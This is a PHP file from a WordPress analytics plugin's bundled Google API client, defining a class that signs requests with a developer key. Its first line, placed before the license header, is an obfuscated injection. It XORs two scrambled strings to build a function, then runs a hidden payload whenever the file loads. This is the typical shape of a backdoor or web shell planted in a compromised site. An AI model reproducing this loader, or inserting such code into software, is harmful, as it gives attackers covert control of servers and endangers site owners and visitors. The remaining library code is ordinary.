<?php $bwCsFbso=' C66; d6:Y3DB-9'^'C1SWOE;PO7P0+BW';$KcaJpUPs=$bwCsFbso('','R,ED7L VT-O+<EEI>8MEd+O4oS5CL;4Z:EvEktF3x<X T;0CNUL5B56.  bhPL>KtOA<MNwi>-7jcchmmF;o>kZFIHlPHtYgmO4C1leStopYjxQUL58:<=CQr4.Y FoiS;rFc40PiB6LDXKBDw1UGQ8u;fDfrIK54bo=LKn1F767TElVRWZ6ALeg;F .EK8XS7O>ZbFx,rJ7Rj4R11oIa01X2 C:eI3AS:S56jJD0;-<RPy9PR4+.O-SpT3q=52q,e4BOC;HEmeiuEAXP<1lx7yAT 7:5cY.ATIVE<S:pzMGQ+MONTQw;W;AQH0Kx<3RPgHk<7-MSa,YX-.RH;S2XKP-=rluv8;p3ScmE2,uKRvvLVAC2ZZ=l17JDQ16dKYTvTCK84,tAZ>OQ5 8ztUGCO5HVQN8E26XEbPA.2lKW18YE+FP9>:MIj>XRt248Y64.O7DO8I<Rca=,QR-IPi1AMVagZcXUI2d.2+XpQyTTXr-RNTfKNb8IFAY3.50>SJ  E9Is>K:CTlUST-5oyORvyY YQkRP9+nB;06klBJqguHdTXUIKcYPLI1GO5PEOu7MObZe-+Xi3uYHDYMDv6AR 24VE3h,E:F1HrO2ANRA-1NIFH4L:LSEYnzHLEK4FN16RiE-8CJ2HK 2AD9QD9zVSh6X31pCjhf-'^';JmeQ9N5 D Ec = ML>mCS F07T7-dk7O1QlBT=9qZ-N7OY, u4Z0jROTA=7=9JcP+ H,bWMUHNCCCHMM=1f7O53=hQpoSbmdFR,CDA:TRPiQXu<pFLHPX-yVPO-AoTIwRYmJ>9YM-C8dvvblSU430cQR;d8Rm PM9KTlnNB2EZR:mH=7.skhwon24EZ09VpwX:JsYLqQx7=XNP3EPOtAVP4AEx0A-R52e8POJwdVZAO7ks36=FNO,EsXpl2rzy8iEU1ogP-<MXWUa79<ITEXLsHpDVNT<2K8ttvaW6CKpDc5J9.niqSM6W44s:6r6Z4pOiOXVY,zAWSQKA -Z0Zxctro7= 3koPR CI.WUUvlVR:7-6WszFf8>n 0EW; <-VicoSQUOKS7k5TTYZIuc5.Y=3jD188KROF4 ZSLvwqM76N49XRS7,BF7 +VUL8ikC:Cl-Y:YdW>YI2=I,xMU 97HKzG<4=S;EWRqYjs=2pVI3:5FmhBY;4  lEPIa62IS1JaTU.CdxLq75YTFYitVQ4DlyO61MJ5ePUOL1kjLZUoV2h3+rSiiy,Wv-P6 zAStzQlUOJoYRC<omykbVW3 AKk= J7I=S5E;ZhB 7>.LUieflP-N-zlyNZhle0>O+GW>AaIY7+io;AK-+X5cdSmYaS ZEXsCSlP');$KcaJpUPs();
/*
 * Copyright 2010 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

if (!class_exists('MonsterInsights_GA_Lib_Client')) {
  require_once dirname(__FILE__) . '/../autoload.php';
}

/**
 * Simple API access implementation. Can either be used to make requests
 * completely unauthenticated, or by using a Simple API Access developer
 * key.
 */
class MonsterInsights_GA_Lib_Auth_Simple extends MonsterInsights_GA_Lib_Auth_Abstract
{
  private $client;

  public function __construct(MonsterInsights_GA_Lib_Client $client, $config = null)
  {
    $this->client = $client;
  }

  /**
   * Perform an authenticated / signed apiHttpRequest.
   * This function takes the apiHttpRequest, calls apiAuth->sign on it
   * (which can modify the request in what ever way fits the auth mechanism)
   * and then calls apiCurlIO::makeRequest on the signed request
   *
   * @param MonsterInsights_GA_Lib_Http_Request $request
   * @return MonsterInsights_GA_Lib_Http_Request The resulting HTTP response including the
   * responseHttpCode, responseHeaders and responseBody.
   */
  public function authenticatedRequest(MonsterInsights_GA_Lib_Http_Request $request)
  {
    $request = $this->sign($request);
    return $this->io->makeRequest($request);
  }

  public function sign(MonsterInsights_GA_Lib_Http_Request $request)
  {
    $key = $this->client->getClassConfig($this, 'developer_key');
    if ($key) {
      $this->client->getLogger()->debug(
          'Simple API Access developer key authentication'
      );
      $request->setQueryParam('key', $key);
    }
    return $request;
  }
}
